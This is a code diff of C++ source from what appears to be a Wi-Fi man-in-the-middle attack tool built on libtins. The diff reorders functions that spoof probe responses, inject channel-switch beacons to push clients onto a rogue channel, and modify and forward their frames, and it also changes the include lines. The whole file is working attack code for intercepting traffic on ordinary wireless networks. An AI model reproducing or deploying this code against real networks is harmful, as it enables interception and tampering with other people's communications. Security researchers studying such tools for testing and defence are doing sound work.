@@ -1,7 +1,6 @@
-#include "attacks/mc_mitm/mc_mitm.h"
 #include <chrono>
 #include <tins/tins.h>
-#include "attacks/scan/scan_AP.h"
+#include "attacks/mc_mitm/mc_mitm.h"
 #include "attacks/mc_mitm/wifi_util.h"
 #include "logger/error_log.h"
 #include "logger/log.h"
@@ -12,33 +11,39 @@ using namespace std;
 using namespace chrono;
 using namespace Tins;
 
-void McMitm::handle_from_ap_real(const unique_ptr<PDU> &pdu, const Dot11 &dot11, const HWAddress<6> &addr1){
-	// Beacon from real AP — update timestamp
-	if(const auto *b = dot11.find_pdu<Dot11Beacon>()){
-		const auto *ch_ie = b->search_option(Dot11ManagementFrame::DS_SET);
-		if(ch_ie && ch_ie->data_size() != 0 && ch_ie->data_ptr()[0] == netconfig.real_channel.ch_num) last_real_beacon =
-				steady_clock::now();
-		return;
+bool McMitm::handle_probe_real(const HWAddress<6> addr2, const Dot11 &dot11) const{
+	if(dot11.find_pdu<Dot11ProbeRequest>()){
+		probe_resp->addr1(addr2);
+		RadioTap rt;
+		rt.inner_pdu(probe_resp->clone());
+		send_to_real(rt);
+		display_traffic(dot11, "Real channel", " -- Replied");
+		return true;
 	}
-
-	const bool might_forward = client_state.get_mac() == addr1 && client_state.should_forward(*pdu);
-
-	//print
-	if(dot11.find_pdu<Dot11Deauthentication>() || dot11.find_pdu<Dot11Disassoc>()){
-		display_traffic(dot11, "Real channel", might_forward ? " -- MitM'ing" : "");
-	} else if(client_state.get_mac() == dot11.addr1()){
-		display_traffic(dot11, "Real channel", might_forward ? " -- MitM'ing" : "");
-	} else if(might_forward){
-		display_traffic(dot11, "Real channel", " -- MitM ap");
+	if(dot11.find_pdu<Dot11ProbeResponse>()){
+		if(addr2 == ap_mac) display_traffic(dot11, "Real channel");
+		return true;
 	}
+	return false;
+}
 
-	// Forward na rogue channel
-	if(might_forward){
-		client_state.modify_packet(*pdu);
-		send_to_rogue(*pdu);
+bool McMitm::handle_auth_from_client_real(HWAddress<6> addr1, const Dot11 &dot11){
+	if(addr1 != ap_mac) return false;
+	if(const auto *auth = dot11.find_pdu<Dot11Authentication>()){
+		const auto client_addr = auth->addr2();
+		display_traffic(dot11, "Real channel");
+
+		if(client_state.get_mac() == client_addr)
+			log(LogLevel::WARNING, "Client {} is connecting on real channel, injecting CSA beacon to try to correct.",
+				client_addr.to_string());
+
+		send_csa_beacon(1, client_addr);
+		send_csa_beacon();
+
+		client_state.update_state(ClientState::Sent_to_rogue);
+		return true;
 	}
-
-	if(dot11.find_pdu<Dot11Deauthentication>()) client_state.update_state(ClientState::Target);
+	return false;
 }
 
 bool McMitm::handle_action_real(const HWAddress<6> &addr2, PDU &pdu, const std::vector<unsigned char> &raw,
@@ -86,39 +91,33 @@ bool McMitm::handle_eapol_real(const HWAddress<6> addr2, PDU &pdu) const{
 	return false;
 }
 
-bool McMitm::handle_probe_real(const HWAddress<6> addr2, const Dot11 &dot11) const{
-	if(dot11.find_pdu<Dot11ProbeRequest>()){
-		probe_resp->addr1(addr2);
-		RadioTap rt;
-		rt.inner_pdu(probe_resp->clone());
-		send_to_real(rt);
-		display_traffic(dot11, "Real channel", " -- Replied");
-		return true;
+void McMitm::handle_from_ap_real(const unique_ptr<PDU> &pdu, const Dot11 &dot11, const HWAddress<6> &addr1){
+	// Beacon from real AP — update timestamp
+	if(const auto *b = dot11.find_pdu<Dot11Beacon>()){
+		const auto *ch_ie = b->search_option(Dot11ManagementFrame::DS_SET);
+		if(ch_ie && ch_ie->data_size() != 0 && ch_ie->data_ptr()[0] == netconfig.real_channel.ch_num) last_real_beacon =
+				steady_clock::now();
+		return;
 	}
-	if(dot11.find_pdu<Dot11ProbeResponse>()){
-		if(addr2 == ap_mac) display_traffic(dot11, "Real channel");
-		return true;
+
+	const bool might_forward = client_state.get_mac() == addr1 && client_state.should_forward(*pdu);
+
+	//print
+	if(dot11.find_pdu<Dot11Deauthentication>() || dot11.find_pdu<Dot11Disassoc>()){
+		display_traffic(dot11, "Real channel", might_forward ? " -- MitM'ing" : "");
+	} else if(client_state.get_mac() == dot11.addr1()){
+		display_traffic(dot11, "Real channel", might_forward ? " -- MitM'ing" : "");
+	} else if(might_forward){
+		display_traffic(dot11, "Real channel", " -- MitM ap");
 	}
-	return false;
-}
 
-bool McMitm::handle_auth_from_client_real(HWAddress<6> addr1, const Dot11 &dot11){
-	if(addr1 != ap_mac) return false;
-	if(const auto *auth = dot11.find_pdu<Dot11Authentication>()){
-		const auto client_addr = auth->addr2();
-		display_traffic(dot11, "Real channel");
-
-		if(client_state.get_mac() == client_addr)
-			log(LogLevel::WARNING, "Client {} is connecting on real channel, injecting CSA beacon to try to correct.",
-				client_addr.to_string());
-
-		send_csa_beacon(1, client_addr);
-		send_csa_beacon();
-
-		client_state.update_state(ClientState::Sent_to_rogue);
-		return true;
+	// Forward na rogue channel
+	if(might_forward){
+		client_state.modify_packet(*pdu);
+		send_to_rogue(*pdu);
 	}
-	return false;
+
+	if(dot11.find_pdu<Dot11Deauthentication>()) client_state.update_state(ClientState::Target);
 }
 
 void McMitm::power_mgmt_response(HWAddress<6> addr2, const Dot11 &dot11) const{
